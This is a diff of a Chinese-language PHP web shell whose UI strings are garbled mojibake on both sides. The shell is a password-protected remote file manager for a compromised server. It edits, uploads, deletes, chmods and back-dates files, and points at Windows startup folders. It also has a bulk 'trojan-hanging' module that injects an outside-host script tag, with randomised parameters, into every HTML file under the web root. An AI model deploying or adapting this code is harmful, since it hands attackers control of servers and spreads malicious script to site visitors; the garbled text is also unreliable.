@@ -1,6 +1,9 @@
 <?php
+require_once('config.php');
+?>
+<?php
 
-$password = "cy";//è®¾ç½®å¯†ç 
+$password = "cy";//ÉèÖÃÃÜÂë
 
 error_reporting(E_ERROR);
 header("content-Type: text/html; charset=gb2312");
@@ -24,10 +27,10 @@ function Root_CSS()
 print<<<END
 <style type="text/css">
 	*{padding:0; margin:0;}
-	body{background:threedface;font-family:"Verdana", "Tahoma", "å®‹ä½“",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
+	body{background:threedface;font-family:"Verdana", "Tahoma", "ËÎÌå",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
 	a{color:#000000;text-decoration:none;}
 	a:hover{background:#BBBBBB;}
-	table{color:#000000;font-family:"Verdana", "Tahoma", "å®‹ä½“",sans-serif;font-size:13px;border:1px solid #999999;}
+	table{color:#000000;font-family:"Verdana", "Tahoma", "ËÎÌå",sans-serif;font-size:13px;border:1px solid #999999;}
 	td{background:#F9F6F4;}
 	.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}
 	.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
@@ -37,7 +40,7 @@ END;
 return false;
 }
 
-//æ–‡ä»¶ç®¡ç†
+//ÎÄ¼ş¹ÜÀí
 class packdir
 {
 	var $out = '';
@@ -212,12 +215,12 @@ function File_Deltree($deldir)
 
 function File_Act($array,$actall,$inver)
 {
-	if(($count = count($array)) == 0) return 'è¯·é€‰æ‹©æ–‡ä»¶';
+	if(($count = count($array)) == 0) return 'ÇëÑ¡ÔñÎÄ¼ş';
 	if($actall == 'e')
 	{
 		$zip = new packdir;
 		if($zip->packdir($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
-		return 'æ‰“åŒ…æ‰€é€‰æ–‡ä»¶å¤±è´¥';
+		return '´ò°üËùÑ¡ÎÄ¼şÊ§°Ü';
 	}
 	$i = 0;
 	while($i < $count)
@@ -225,14 +228,14 @@ function File_Act($array,$actall,$inver)
 		$array[$i] = urldecode($array[$i]);
 		switch($actall)
 		{
-			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return 'è·¯å¾„é”™è¯¯'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = 'å¤åˆ¶'; break;
-			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = 'åˆ é™¤'; break;
-			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return 'å±æ€§å€¼é”™è¯¯'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = 'ä¿®æ”¹å±æ€§'; break;
-			case "d" : @touch($array[$i],strtotime($inver)); $msg = 'ä¿®æ”¹æ—¶é—´'; break;
+			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return 'Â·¾¶´íÎó'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '¸´ÖÆ'; break;
+			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = 'É¾³ı'; break;
+			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return 'ÊôĞÔÖµ´íÎó'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = 'ĞŞ¸ÄÊôĞÔ'; break;
+			case "d" : @touch($array[$i],strtotime($inver)); $msg = 'ĞŞ¸ÄÊ±¼ä'; break;
 		}
 		$i++;
 	}
-	return 'æ‰€é€‰æ–‡ä»¶'.$msg.'å®Œæ¯•';
+	return 'ËùÑ¡ÎÄ¼ş'.$msg.'Íê±Ï';
 }
 
 function File_Edit($filepath,$filename,$dim = '')
@@ -269,18 +272,18 @@ function CheckDate(){
 	var re = document.getElementById('mtime').value;
 	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
 	var r = re.match(reg);
-	if(r==null){alert('æ—¥æœŸæ ¼å¼ä¸æ­£ç¡®!æ ¼å¼:yyyy-mm-dd hh:mm:ss');return false;}
+	if(r==null){alert('ÈÕÆÚ¸ñÊ½²»ÕıÈ·!¸ñÊ½:yyyy-mm-dd hh:mm:ss');return false;}
 	else{document.getElementById('editor').submit();}
 }
 </script>
-<div class="actall">æŸ¥æ‰¾å†…å®¹: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
-<input type='button' value="æŸ¥æ‰¾" onclick="search(searchs.value)"></div>
+<div class="actall">²éÕÒÄÚÈİ: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
+<input type='button' value="²éÕÒ" onclick="search(searchs.value)"></div>
 <form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
 <div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
 <div class="actall"><textarea name="pfc" style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
-<div class="actall">æ–‡ä»¶ä¿®æ”¹æ—¶é—´ <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
-<div class="actall"><input type="button" value="ä¿å­˜" onclick="CheckDate();" style="width:80px;">
-<input type="button" value="è¿”å›" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
+<div class="actall">ÎÄ¼şĞŞ¸ÄÊ±¼ä <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
+<div class="actall"><input type="button" value="±£´æ" onclick="CheckDate();" style="width:80px;">
+<input type="button" value="·µ»Ø" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
 </form>
 END;
 }
@@ -289,7 +292,7 @@ function File_Soup($p)
 {
 	$THIS_DIR = urlencode($p);
 	$UP_SIZE = get_cfg_var('upload_max_filesize');
-	$MSG_BOX = 'å•ä¸ªé™„ä»¶å…è®¸å¤§å°:'.$UP_SIZE.', æ”¹åæ ¼å¼(new.php),å¦‚ä¸ºç©º,åˆ™ä¿æŒåŸæ–‡ä»¶å.';
+	$MSG_BOX = 'µ¥¸ö¸½¼şÔÊĞí´óĞ¡:'.$UP_SIZE.', ¸ÄÃû¸ñÊ½(new.php),ÈçÎª¿Õ,Ôò±£³ÖÔ­ÎÄ¼şÃû.';
 	if(!empty($_POST['updir']))
 	{
 		if(count($_FILES['soup']) >= 1)
@@ -301,55 +304,55 @@ function File_Soup($p)
 				{
 					$souptmp = $_FILES['soup']['tmp_name'][$key];
 					if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];
-					$MSG_BOX .= File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? '<br>'.$soupname.'ä¸Šä¼ æˆåŠŸ' : '<br>'.$soupname.'ä¸Šä¼ å¤±è´¥';
+					$MSG_BOX .= File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? '<br>'.$soupname.'ÉÏ´«³É¹¦' : '<br>'.$soupname.'ÉÏ´«Ê§°Ü';
 				}
 				$i++;
 			}
 		}
 		else
 		{
-			$MSG_BOX = 'è¯·é€‰æ‹©æ–‡ä»¶';
+			$MSG_BOX = 'ÇëÑ¡ÔñÎÄ¼ş';
 		}
 	}
 print<<<END
 <div class="msgbox">{$MSG_BOX}</div>
 <form method="POST" id="editor" action="?s=q&p={$THIS_DIR}" enctype="multipart/form-data">
-<div class="actall">ä¸Šä¼ åˆ°ç›®å½•: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
-<div class="actall">é™„ä»¶1 <input type="file" name="soup[]" style="width:400px;height:22px;"> æ”¹å <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
-<div class="actall">é™„ä»¶2 <input type="file" name="soup[]" style="width:400px;height:22px;"> æ”¹å <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
-<div class="actall">é™„ä»¶3 <input type="file" name="soup[]" style="width:400px;height:22px;"> æ”¹å <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
-<div class="actall">é™„ä»¶4 <input type="file" name="soup[]" style="width:400px;height:22px;"> æ”¹å <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
-<div class="actall">é™„ä»¶5 <input type="file" name="soup[]" style="width:400px;height:22px;"> æ”¹å <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
-<div class="actall">é™„ä»¶6 <input type="file" name="soup[]" style="width:400px;height:22px;"> æ”¹å <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
-<div class="actall">é™„ä»¶7 <input type="file" name="soup[]" style="width:400px;height:22px;"> æ”¹å <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
-<div class="actall">é™„ä»¶8 <input type="file" name="soup[]" style="width:400px;height:22px;"> æ”¹å <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
-<div class="actall"><input type="submit" value="ä¸Šä¼ " style="width:80px;"> <input type="button" value="è¿”å›" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
+<div class="actall">ÉÏ´«µ½Ä¿Â¼: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
+<div class="actall">¸½¼ş1 <input type="file" name="soup[]" style="width:400px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
+<div class="actall">¸½¼ş2 <input type="file" name="soup[]" style="width:400px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
+<div class="actall">¸½¼ş3 <input type="file" name="soup[]" style="width:400px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
+<div class="actall">¸½¼ş4 <input type="file" name="soup[]" style="width:400px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
+<div class="actall">¸½¼ş5 <input type="file" name="soup[]" style="width:400px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
+<div class="actall">¸½¼ş6 <input type="file" name="soup[]" style="width:400px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
+<div class="actall">¸½¼ş7 <input type="file" name="soup[]" style="width:400px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
+<div class="actall">¸½¼ş8 <input type="file" name="soup[]" style="width:400px;height:22px;"> ¸ÄÃû <input type="text" name="reup[]" style="width:130px;height:22px;"></div>
+<div class="actall"><input type="submit" value="ÉÏ´«" style="width:80px;"> <input type="button" value="·µ»Ø" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
 </form>
 END;
 }
 
 function File_a($p)
 {
-	$MSG_BOX = 'ç­‰å¾…æ¶ˆæ¯é˜Ÿåˆ—';
+	$MSG_BOX = 'µÈ´ıÏûÏ¢¶ÓÁĞ';
 	$FILE_DIR = File_Str(dirname(__FILE__));
 	$ROOT_DIR = File_Mode();
 	$THIS_DIR = urlencode(File_Str($p));
 	$UP_DIR = urlencode(File_Str(dirname($p)));
 	$NUM_D = 0;
 	$NUM_F = 0;
-	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? 'ç¼–è¾‘æ–‡ä»¶ '.$_POST['pfn'].' æˆåŠŸ' : 'ç¼–è¾‘æ–‡ä»¶ '.$_POST['pfn'].' å¤±è´¥';@touch($_POST['pfn'],$intime);}
-	if(!empty($_POST['ufs'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($p.'/'.$upfilename)) ? 'ä¸Šä¼ æ–‡ä»¶ '.$upfilename.' æˆåŠŸ' : 'ä¸Šä¼ æ–‡ä»¶ '.$upfilename.' å¤±è´¥';}
+	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '±à¼­ÎÄ¼ş '.$_POST['pfn'].' ³É¹¦' : '±à¼­ÎÄ¼ş '.$_POST['pfn'].' Ê§°Ü';@touch($_POST['pfn'],$intime);}
+	if(!empty($_POST['ufs'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($p.'/'.$upfilename)) ? 'ÉÏ´«ÎÄ¼ş '.$upfilename.' ³É¹¦' : 'ÉÏ´«ÎÄ¼ş '.$upfilename.' Ê§°Ü';}
 	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
-	if(!empty($_GET['mn'])){$MSG_BOX = @rename(File_Str($p.'/'.$_GET['mn']),File_Str($p.'/'.$_GET['rn'])) ? 'æ”¹å '.$_GET['mn'].' ä¸º '.$_GET['rn'].' æˆåŠŸ' : 'æ”¹å '.$_GET['mn'].' ä¸º '.$_GET['rn'].' å¤±è´¥';}
-	if(!empty($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($p.'/'.$_GET['dn']),0777) ? 'åˆ›å»ºç›®å½• '.$_GET['dn'].' æˆåŠŸ' : 'åˆ›å»ºç›®å½• '.$_GET['dn'].' å¤±è´¥';}
-	if(!empty($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'åˆ é™¤ç›®å½• '.$_GET['dd'].' æˆåŠŸ' : 'åˆ é™¤ç›®å½• '.$_GET['dd'].' å¤±è´¥';}
-	if(!empty($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = 'ä¸‹è½½æ–‡ä»¶ä¸å­˜åœ¨';}
+	if(!empty($_GET['mn'])){$MSG_BOX = @rename(File_Str($p.'/'.$_GET['mn']),File_Str($p.'/'.$_GET['rn'])) ? '¸ÄÃû '.$_GET['mn'].' Îª '.$_GET['rn'].' ³É¹¦' : '¸ÄÃû '.$_GET['mn'].' Îª '.$_GET['rn'].' Ê§°Ü';}
+	if(!empty($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($p.'/'.$_GET['dn']),0777) ? '´´½¨Ä¿Â¼ '.$_GET['dn'].' ³É¹¦' : '´´½¨Ä¿Â¼ '.$_GET['dn'].' Ê§°Ü';}
+	if(!empty($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'É¾³ıÄ¿Â¼ '.$_GET['dd'].' ³É¹¦' : 'É¾³ıÄ¿Â¼ '.$_GET['dd'].' Ê§°Ü';}
+	if(!empty($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = 'ÏÂÔØÎÄ¼ş²»´æÔÚ';}
 	Root_CSS();
 print<<<END
 <script type="text/javascript">
 	function Inputok(msg,gourl)
 	{
-		smsg = "å½“å‰æ–‡ä»¶:[" + msg + "]";
+		smsg = "µ±Ç°ÎÄ¼ş:[" + msg + "]";
 		re = prompt(smsg,unescape(msg));
 		if(re)
 		{
@@ -359,7 +362,7 @@ print<<<END
 	}
 	function Delok(msg,gourl)
 	{
-		smsg = "ç¡®å®šè¦åˆ é™¤[" + unescape(msg) + "]å—?";
+		smsg = "È·¶¨ÒªÉ¾³ı[" + unescape(msg) + "]Âğ?";
 		if(confirm(smsg))
 		{
 			if(gourl == 'b')
@@ -372,14 +375,14 @@ print<<<END
 	}
 	function CheckDate(msg,gourl)
 	{
-		smsg = "å½“å‰æ–‡ä»¶æ—¶é—´:[" + msg + "]";
+		smsg = "µ±Ç°ÎÄ¼şÊ±¼ä:[" + msg + "]";
 		re = prompt(smsg,msg);
 		if(re)
 		{
 			var url = gourl + re;
 			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
 			var r = re.match(reg);
-			if(r==null){alert('æ—¥æœŸæ ¼å¼ä¸æ­£ç¡®!æ ¼å¼:yyyy-mm-dd hh:mm:ss');return false;}
+			if(r==null){alert('ÈÕÆÚ¸ñÊ½²»ÕıÈ·!¸ñÊ½:yyyy-mm-dd hh:mm:ss');return false;}
 			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
 		}
 	}
@@ -408,31 +411,31 @@ print<<<END
 	<form method="GET"><input type="hidden" id="s" name="s" value="a">
 	<input type="text" name="p" value="{$p}" style="width:550px;height:22px;">
 	<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
-	<option>---ç‰¹æ®Šç›®å½•---</option>
-	<option value="{$ROOT_DIR}"> ç½‘ç«™æ ¹ç›®å½• </option>
-	<option value="{$FILE_DIR}"> æœ¬ç¨‹åºç›®å½• </option>
-	<option value="C:/Documents and Settings/All Users/ã€Œå¼€å§‹ã€èœå•/ç¨‹åº/å¯åŠ¨"> æ‰€æœ‰ç»„å¯åŠ¨é¡¹ </option>
-	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> è‹±æ–‡å¯åŠ¨é¡¹ </option>
+	<option>---ÌØÊâÄ¿Â¼---</option>
+	<option value="{$ROOT_DIR}"> ÍøÕ¾¸ùÄ¿Â¼ </option>
+	<option value="{$FILE_DIR}"> ±¾³ÌĞòÄ¿Â¼ </option>
+	<option value="C:/Documents and Settings/All Users/¡¸¿ªÊ¼¡¹²Ëµ¥/³ÌĞò/Æô¶¯"> ËùÓĞ×éÆô¶¯Ïî </option>
+	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> Ó¢ÎÄÆô¶¯Ïî </option>
 	<option value="C:/RECYCLER"> RECYCLER </option>
 	<option value="C:/Program Files"> Program Files </option>
-	</select> <input type="submit" value="è½¬åˆ°" style="width:50px;"></form>
+	</select> <input type="submit" value="×ªµ½" style="width:50px;"></form>
 	<div style="margin-top:3px;"></div>
 	<form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
-	<input type="button" value="æ–°å»ºæ–‡ä»¶" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
-	<input type="button" value="æ–°å»ºç›®å½•" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
-	<input type="button" value="æ‰¹é‡ä¸Šä¼ " onclick="window.location='?s=q&p={$p}';"> 
+	<input type="button" value="ĞÂ½¨ÎÄ¼ş" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
+	<input type="button" value="ĞÂ½¨Ä¿Â¼" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
+	<input type="button" value="ÅúÁ¿ÉÏ´«" onclick="window.location='?s=q&p={$p}';"> 
 	<input type="file" name="ufp" style="width:300px;height:22px;">
 	<input type="text" name="ufn" style="width:121px;height:22px;">
-	<input type="submit" name="ufs" value="ä¸Šä¼ " style="width:50px;">
+	<input type="submit" name="ufs" value="ÉÏ´«" style="width:50px;">
 	</form>
 	</div>
 	<form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}">
 	<table border="0"><tr>
-	<td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>ä¸Šçº§ç›®å½•</b></a> </td>
-	<td class="toptd" style="width:80px;"> æ“ä½œ </td>
-	<td class="toptd" style="width:50px;"> å±æ€§ </td>
-	<td class="toptd" style="width:175px;"> ä¿®æ”¹æ—¶é—´ </td>
-	<td class="toptd" style="width:75px;"> å¤§å° </td></tr>
+	<td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>ÉÏ¼¶Ä¿Â¼</b></a> </td>
+	<td class="toptd" style="width:80px;"> ²Ù×÷ </td>
+	<td class="toptd" style="width:50px;"> ÊôĞÔ </td>
+	<td class="toptd" style="width:175px;"> ĞŞ¸ÄÊ±¼ä </td>
+	<td class="toptd" style="width:75px;"> ´óĞ¡ </td></tr>
 END;
 	if(($h_d = @opendir($p)) == NULL) return false;
 	while(false !== ($Filename = @readdir($h_d)))
@@ -446,8 +449,8 @@ END;
 			$Filepath = urlencode($Filepath);
 			echo "\n".'<tr><td><a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b>'.$Filename.'</b></a></td>';
 			$Filename = urlencode($Filename);
-			echo '<td><a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;">åˆ é™¤</a> ';
-			echo '<a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;">æ”¹å</a></td>';
+			echo '<td><a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;">É¾³ı</a> ';
+			echo '<a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;">¸ÄÃû</a></td>';
 			echo '<td><a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;">'.$Fileperm.'</a></td>';
 			echo '<td>'.$Filetime.'</td> ';
 			echo '<td> </td></tr>'."\r\n";
@@ -469,8 +472,8 @@ END;
 			echo "\n".'<tr><td><input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a></td>';
 			$Filepath = urlencode($Filepath);
 			$Filename = urlencode($Filename);
-			echo '<td><a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'">ç¼–è¾‘</a> ';
-			echo '<a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;">æ”¹å</a></td>';
+			echo '<td><a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'">±à¼­</a> ';
+			echo '<a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;">¸ÄÃû</a></td>';
 			echo '<td>'.$Fileperm.'</td>';
 			echo '<td>'.$Filetime.'</td>';
 			echo '<td align="right"><a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a></td></tr>'."\r\n";
@@ -483,18 +486,18 @@ print<<<END
 <div class="actall"><input type="hidden" id="actall" name="actall" value="undefined">
 <input type="hidden" id="inver" name="inver" value="undefined">
 <input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
-<input type="button" value="å¤åˆ¶" onclick="SubmitUrl('å¤åˆ¶æ‰€é€‰æ–‡ä»¶åˆ°è·¯å¾„: ','{$THIS_DIR}','a');return false;"> 
-<input type="button" value="åˆ é™¤" onclick="Delok('æ‰€é€‰æ–‡ä»¶','b');return false;"> 
-<input type="button" value="å±æ€§" onclick="SubmitUrl('ä¿®æ”¹æ‰€é€‰æ–‡ä»¶å±æ€§å€¼ä¸º: ','0666','c');return false;"> 
-<input type="button" value="æ—¶é—´" onclick="CheckDate('2009-01-01 00:00:00','d');return false;"> 
-<input type="button" value="æ‰“åŒ…" onclick="SubmitUrl('æ‰“åŒ…å¹¶ä¸‹è½½æ‰€é€‰æ–‡ä»¶ä¸‹è½½åä¸º: ','spider.tar.gz','e');return false;"> 
-ç›®å½•({$NUM_D}) / æ–‡ä»¶({$NUM_F})</div>
+<input type="button" value="¸´ÖÆ" onclick="SubmitUrl('¸´ÖÆËùÑ¡ÎÄ¼şµ½Â·¾¶: ','{$THIS_DIR}','a');return false;"> 
+<input type="button" value="É¾³ı" onclick="Delok('ËùÑ¡ÎÄ¼ş','b');return false;"> 
+<input type="button" value="ÊôĞÔ" onclick="SubmitUrl('ĞŞ¸ÄËùÑ¡ÎÄ¼şÊôĞÔÖµÎª: ','0666','c');return false;"> 
+<input type="button" value="Ê±¼ä" onclick="CheckDate('2009-01-01 00:00:00','d');return false;"> 
+<input type="button" value="´ò°ü" onclick="SubmitUrl('´ò°ü²¢ÏÂÔØËùÑ¡ÎÄ¼şÏÂÔØÃûÎª: ','spider.tar.gz','e');return false;"> 
+Ä¿Â¼({$NUM_D}) / ÎÄ¼ş({$NUM_F})</div>
 </form>
 END;
 	return true;
 }
 
-//æ‰¹é‡æŒ‚é©¬
+//ÅúÁ¿¹ÒÂí
 function Guama_Pass($length)
 {
 	$possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
@@ -558,7 +561,7 @@ function Guama_b()
 			$temp = explode('[-',$_POST['gc']);
 			$gk = $temp[0];
 			preg_match_all("/\[\-([^~]*?)\-\]/i",$_POST['gc'],$nc);
-			if(!eregi("^[0-9]{1,2}$",$nc[1][0])){echo '<a href="#" onclick="history.back();">å¼‚å¸¸ç»ˆæ­¢</a>'; return false;}
+			if(!eregi("^[0-9]{1,2}$",$nc[1][0])){echo '<a href="#" onclick="history.back();">Òì³£ÖÕÖ¹</a>'; return false;}
 			$gm = (int)$nc[1][0];
 			$gf = $nc[0][0];
 		}
@@ -571,7 +574,7 @@ function Guama_b()
 		if(!isset($_POST['gx'])) $gk = '';
 		$gd = isset($_POST['gd']) ? true : false;
 		$gb = ($_POST['gb'] == 'a') ? true : false;
-		echo Guama_Auto($_POST['gp'],$_POST['gt'],$_POST['gl'],$_POST['gc'],$gm,$gf,$_POST['gi'],$gk,$gd,$gb) ? '<a href="#" onclick="history.back();">æŒ‚é©¬å®Œæ¯•</a>' : '<a href="#" onclick="history.back();">å¼‚å¸¸ç»ˆæ­¢</a>';
+		echo Guama_Auto($_POST['gp'],$_POST['gt'],$_POST['gl'],$_POST['gc'],$gm,$gf,$_POST['gi'],$gk,$gd,$gb) ? '<a href="#" onclick="history.back();">¹ÒÂíÍê±Ï</a>' : '<a href="#" onclick="history.back();">Òì³£ÖÕÖ¹</a>';
 		return false;
 	}
 	$FILE_DIR = File_Str(dirname(__FILE__));
@@ -586,44 +589,44 @@ function Fulll(i){
   return true;
 }
 function autorun(){
-	if(document.getElementById('gp').value == ''){alert('æŒ‚é©¬è·¯å¾„ä¸èƒ½ä¸ºç©º');return false;}
-	if(document.getElementById('gt').value == ''){alert('æ–‡ä»¶ç±»å‹ä¸èƒ½ä¸ºç©º');return false;}
-	if(document.getElementById('gc').value == ''){alert('æŒ‚é©¬ä»£ç ä¸èƒ½ä¸ºç©º');return false;}
+	if(document.getElementById('gp').value == ''){alert('¹ÒÂíÂ·¾¶²»ÄÜÎª¿Õ');return false;}
+	if(document.getElementById('gt').value == ''){alert('ÎÄ¼şÀàĞÍ²»ÄÜÎª¿Õ');return false;}
+	if(document.getElementById('gc').value == ''){alert('¹ÒÂí´úÂë²»ÄÜÎª¿Õ');return false;}
 	document.getElementById('sform').submit();
 }
 </script>
 <form method="POST" name="sform" id="sform" action="?s=b">
-<div class="actall" style="height:35px;">æŒ‚é©¬è·¯å¾„ <input type="text" name="gp" id="gp" value="{$ROOT_DIR}" style="width:500px;">
+<div class="actall" style="height:35px;">¹ÒÂíÂ·¾¶ <input type="text" name="gp" id="gp" value="{$ROOT_DIR}" style="width:500px;">
 <select onchange='return Fulll(options[selectedIndex].value)'>
-<option value="0" selected>--èŒƒå›´é€‰æ‹©--</option>
-<option value="1">ç½‘ç«™è·Ÿç›®å½•</option>
-<option value="2">æœ¬ç¨‹åºç›®å½•</option>
+<option value="0" selected>--·¶Î§Ñ¡Ôñ--</option>
+<option value="1">ÍøÕ¾¸úÄ¿Â¼</option>
+<option value="2">±¾³ÌĞòÄ¿Â¼</option>
 </select></div>
-<div class="actall" style="height:35px;">æ–‡ä»¶ç±»å‹ <input type="text" name="gt" id="gt" value=".htm|.html|.shtml" style="width:500px;">
+<div class="actall" style="height:35px;">ÎÄ¼şÀàĞÍ <input type="text" name="gt" id="gt" value=".htm|.html|.shtml" style="width:500px;">
 <select onchange='return Fulll(options[selectedIndex].value)'>
-<option value="0" selected>--ç±»å‹é€‰æ‹©--</option>
-<option value="3">é™æ€æ–‡ä»¶</option>
-<option value="4">è„šæœ¬é™æ€</option>
-<option value="5">JSæ–‡ä»¶</option>
+<option value="0" selected>--ÀàĞÍÑ¡Ôñ--</option>
+<option value="3">¾²Ì¬ÎÄ¼ş</option>
+<option value="4">½Å±¾¾²Ì¬</option>
+<option value="5">JSÎÄ¼ş</option>
 </select></div>
-<div class="actall" style="height:35px;">è¿‡æ»¤å¯¹è±¡ <input type="text" name="gl" value="templet|templets|default|editor|fckeditor.html" style="width:500px;" disabled>
-<input type="radio" name="inout" value="a" onclick="gl.disabled=false;">å¼€å¯ <input type="radio" name="inout" value="b" onclick="gl.disabled=true;" checked>å…³é—­</div>
-<div class="actall">æŒ‚é©¬ä»£ç  <textarea name="gc" id="gc" style="width:610px;height:180px;"><script language=javascript src="http://www.baidu.com/ad.js?[-6-]"></script></textarea>
-<div class="msgbox">æŒ‚é©¬å˜å½¢è¯´æ˜: ç¨‹åºè‡ªåŠ¨å¯»æ‰¾[-6-]æ ‡ç­¾,æ›¿æ¢ä¸ºéšæœºå­—ç¬¦,6è¡¨ç¤ºå…­ä½éšæœºå­—ç¬¦,æœ€å¤§12ä½,å¦‚æœä¸å˜å½¢å¯ä»¥ä¸åŠ [-6-]æ ‡ç­¾.
-<br>æŒ‚ä¸Šç¤ºä¾‹: <script language=javascript src="http://www.baidu.com/ad.js?EMTDSU"></script></div></div>
-<div class="actall" style="height:35px;"><input type="radio" name="gi" value="a" checked>æ’å…¥</head>æ ‡ç­¾ä¹‹å‰ 
